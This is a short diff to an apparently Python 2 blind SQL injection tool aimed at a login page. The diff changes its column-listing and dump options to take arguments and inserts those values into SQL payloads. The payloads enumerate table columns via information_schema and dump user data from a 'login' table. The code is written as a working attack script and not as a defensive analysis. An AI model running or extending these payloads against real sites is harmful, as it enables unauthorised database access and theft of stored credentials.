@@ -43,8 +43,8 @@ def sqli(sql):
 parser = OptionParser(usage="usage: %prog [-D/-t/-c tablename/-d columnname] -u http://10.10.10.10/login.php -m 'Unknown USER' ")
 parser.add_option("-D","--database",action="store_true",dest="database", help="List of Databases")
 parser.add_option("-t","--table",action="store_true", dest="table", help="List of Tables")
-parser.add_option("-c","--column",action="store_true", dest="column", help="List of Columns")
-parser.add_option("-d","--dump",action="store_true", dest="dump", help="Dump value of Columns")
+parser.add_option("-c","--column", dest="column", help="List of Columns")
+parser.add_option("-d","--dump", dest="dump", help="Dump value of Columns")
 parser.add_option("-u","--url",dest="url",help="URL of the Target")
 parser.add_option("-m","--msg",dest="msg",help="TRUE message")
 
@@ -67,10 +67,10 @@ if options.table:
 
 if options.column:
         #update tablename here
-        payload = "select group_concat(column_name) from information_schema.columns where table_name='tablename' limit 1"
+        payload = "select group_concat(column_name) from information_schema.columns where table_name='%s' limit 1" % options.column
         print sqli(payload)
 
 if options.dump:
         #update user,pass with ur column
-        payload = "select group_concat(user) from login limit 1"
+        payload = "select group_concat(%s) from login limit 1" % options.dump
         print sqli(payload)
